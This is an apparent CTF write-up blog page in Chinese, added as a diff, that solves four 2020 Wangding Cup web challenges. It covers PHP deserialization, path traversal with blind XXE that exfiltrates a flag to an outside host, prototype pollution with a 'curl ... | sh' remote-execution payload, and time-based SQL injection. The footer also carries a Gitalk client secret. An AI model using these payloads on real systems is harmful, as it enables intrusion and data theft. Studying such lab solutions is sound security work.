@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>[网鼎杯 2020 青龙组]web |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="[网鼎杯 2020 青龙组]web |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="[网鼎杯 2020 青龙组]web"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/nmxAW2K-f/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+        </span>
+            <h1>[网鼎杯 2020 青龙组]web</h1>
+            <span class="meta">
+            	Posted on
+              2020-05-10，7 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>AreUSerialz</p>
+<!-- more -->
+<p>====<br>
+题目给出了源码。是个反序列化。<br>
+大致就是op决定执行函数。filename是文件名。contents是文件内容。<br>
+有个文件读取。直接op=2。filename=flag.php就行了<br>
+由于PHP版本是7。而php7对于类的属性。并不敏感。题目中的protected属性。由于需要%00。所以不能直接用。可以改为public属性带入。</p>
+<pre><code>class FileHandler {
+    public  $op=2;
+    public  $filename='flag.php';
+}
+$a=new FileHandler();
+echo urlencode(serialize($a));
+</code></pre>
+<p>这里如果带上了contents属性。就不能读取。不知道为啥。<br>
+或者就是带上属性。然后修改类的属性数量。3改为2。表示这个类只有两个属性(貌似这里修改属性可以绕过destruct切换目录)<br>
+还能通过/proc/self/cmdline获得apache的配置文件路径<br>
+然后用绝对路径去读取<br>
+还有一种解法是。利用S代替s &quot;\00*\00xxx&quot;这样。</p>
+<pre><code>&lt;?php
+class test {
+        public function scan(){
+                var_dump(getcwd());
+        }
+        public function __destruct(){
+                $this-&gt;scan();
+        }
+}
+$a=new test();
+#触发destruct调用的scan函数。当前目录会在根目录/
+$a-&gt;scan();
+#直接调用的scan函数。目录会在当前目录/var/www/html
+</code></pre>
+<h1 id="filejava">filejava</h1>
+<p>首先就是个文件上传。然后下载处存在任意文件下载。<br>
+读取web.xml</p>
+<pre><code>../../../../../../../../../../../usr/local/tomcat/webapps/file_in_java/WEB-INF/web.xml
+</code></pre>
+<p>webapps是tomcat的所有项目的根目录。然后file_in_java是这个项目的根目录。相当于/var/www/html中的html</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;web-app xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://java.sun.com/xml/ns/javaee&quot; xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&quot; id=&quot;WebApp_ID&quot; version=&quot;2.5&quot;&gt;
+  &lt;display-name&gt;file_in_java&lt;/display-name&gt;
+  &lt;welcome-file-list&gt;
+    &lt;welcome-file&gt;upload.jsp&lt;/welcome-file&gt;
+  &lt;/welcome-file-list&gt;
+  &lt;servlet&gt;
+    &lt;description&gt;&lt;/description&gt;
+    &lt;display-name&gt;UploadServlet&lt;/display-name&gt;
+    &lt;servlet-name&gt;UploadServlet&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;cn.abc.servlet.UploadServlet&lt;/servlet-class&gt;
+  &lt;/servlet&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;UploadServlet&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/UploadServlet&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;
+  &lt;servlet&gt;
+    &lt;description&gt;&lt;/description&gt;
+    &lt;display-name&gt;ListFileServlet&lt;/display-name&gt;
+    &lt;servlet-name&gt;ListFileServlet&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;cn.abc.servlet.ListFileServlet&lt;/servlet-class&gt;
+  &lt;/servlet&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;ListFileServlet&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/ListFileServlet&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;
+  &lt;servlet&gt;
+    &lt;description&gt;&lt;/description&gt;
+    &lt;display-name&gt;DownloadServlet&lt;/display-name&gt;
+    &lt;servlet-name&gt;DownloadServlet&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;cn.abc.servlet.DownloadServlet&lt;/servlet-class&gt;
+  &lt;/servlet&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;DownloadServlet&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/DownloadServlet&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;
+&lt;/web-app&gt;
+</code></pre>
+<p>根据web.xml<br>
+我们得到当前项目下有ListFileServlet和DownloadServlet<br>
+class文件在WEB-INF/classes下<br>
+所以我们去读取../../../../../../../../../../../usr/local/tomcat/webapps/file_in_java/WEB-INF/classes/cn/abc/servlet/UploadServlet.class<br>
+反编译后得到java代码</p>
+<pre><code>        
+        if (filename.startsWith(&quot;excel-&quot;) &amp;&amp; &quot;xlsx&quot;.equals(fileExtName)) {
+          
+          try {
+
+            
+            Workbook wb1 = WorkbookFactory.create(in);
+            Sheet sheet = wb1.getSheetAt(0);
+            System.out.println(sheet.getFirstRowNum());
+          } catch (InvalidFormatException e) {
+            System.err.println(&quot;poi-ooxml-3.10 has something wrong&quot;);
+            e.printStackTrace();
+          } 
+        }
+</code></pre>
+<p>如果是以excel-开头。然后是xlsx结尾的文件。就会调用WorkbookFactory.create去处理xlsx文件<br>
+这会触发xxe</p>
+<pre><code>https://www.cnblogs.com/thespace/p/12400719.html
+</code></pre>
+<p>由于代码中。解析excel后没有输出点。。所以是bind xxe</p>
+<pre><code>https://xz.aliyun.com/t/3357#toc-8
+</code></pre>
+<p>远程</p>
+<pre><code>&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;
+&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM 'http://xxxxxxx:6666?p=%file;'&gt;&quot;&gt;
+</code></pre>
+<p>将excel解压后。修改Content-type.xml。在第二行加入如下代码</p>
+<pre><code>&lt;!DOCTYPE convert [ 
+&lt;!ENTITY % remote SYSTEM &quot;http://tjxnb.com/file.dtd&quot;&gt;
+%remote;%int;%send;
+]&gt;
+</code></pre>
+<p>监听端口。文件上传。得到Flag、</p>
+<h1 id="notes">notes</h1>
+<p>源码审计。<br>
+undefsafe库存在原型参数链污染。</p>
+<pre><code>let id = req.body.id;
+let author = req.body.author;
+let enote = req.body.raw;
+if (id &amp;&amp; author &amp;&amp; enote) {
+    notes.edit_note(id, author, enote);
+edit_note(id, author, raw) {
+    undefsafe(this.note_list, id + '.author', author);
+    undefsafe(this.note_list, id + '.raw_note', raw);
+}
+</code></pre>
+<p>这里先接受了post的一个author和raw和id<br>
+然后传入Edit_note函数。这里使用了undefsafe函数。<br>
+如果id传为为<code>__proto__</code>就存在参数链污染<br>
+以下是114师傅的EXP</p>
+<pre><code>a = {'raw': 'curl http://tjxnb.com/1.html | sh', 'id': '__proto__', 'author': 'test'}
+#只需要id为__proto__。其他随意
+import requests
+url = &quot;http://f13d06664e32474aad611a68000b395fba21a904678b4e4a.cloudgame2.ichunqiu.com:8080/&quot;
+print(requests.post(url+&quot;edit_note&quot;,json=a).text);
+print(requests.get(url+&quot;status&quot;).text);
+</code></pre>
+<p>赋值note_list。为<code>note_list.__proto__author='test'</code><br>
+那么我们在<code>for(let index in commands){console.log(commands[index])}</code><br>
+会把comamnds继承链上的东西都打印出来。那么在代码中。他会将这个值exec执行<br>
+从而变成了命令执行<br>
+<img src="https://guokeya.github.io/post-images/1589176058687.png" alt="" loading="lazy"></p>
+<h1 id="trace">trace</h1>
+<p>只有一个注册功能。<br>
+注入点在username处。<br>
+想到后台sql语句是<code>insert into user(name,pass) values('username','password')</code><br>
+开始构造sql语句为<code>',sleep(1))%23</code>成功延时<br>
+<code>',sleep(database()))%23</code>延时三秒。得到数据库长度<br>
+<code>',if((ascii(mid(database(),1,1)=99),sleep(1),1)))%23</code>得到数据库名ctf。<br>
+然后就没思路了。只能插入20个语句。并且过滤了information。一开始用innob的库去绕。发现版本不对。没这个库。然后用无列名注入。死在20个语句上。<br>
+114狮虎NB！！这里可以用pow(999,999)来造成报错。导致成功延时。报错没插入</p>
+<pre><code>if(ascii(substr((select `2` from (select 1,2 union select * from flag limit 1,1)x),1,1))=102, sleep(1),pow(999,999))
+</code></pre>
+<p>然而没环境了。</p>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/WbMhNdDm1/">
+              <span class="post-title">
+                LFI2019(文件包含。无数字字母webshell)&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br ><!--test--></a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
